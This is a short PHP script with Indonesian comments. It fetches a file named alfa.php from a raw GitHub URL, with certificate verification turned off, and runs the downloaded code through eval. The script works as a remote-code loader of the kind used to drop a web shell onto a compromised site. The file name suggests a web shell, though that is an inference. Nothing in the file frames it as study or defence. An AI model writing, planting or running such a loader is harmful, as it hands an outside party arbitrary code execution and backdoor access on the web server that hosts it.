<?php
function getURL($url) {
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return false;
}

// Contoh penggunaan:
$phpCode = getURL('https://raw.githubusercontent.com/eagles227/claudia/main/alfa.php');
if ($phpCode !== false) {
    eval("?>". $phpCode);
}
?>
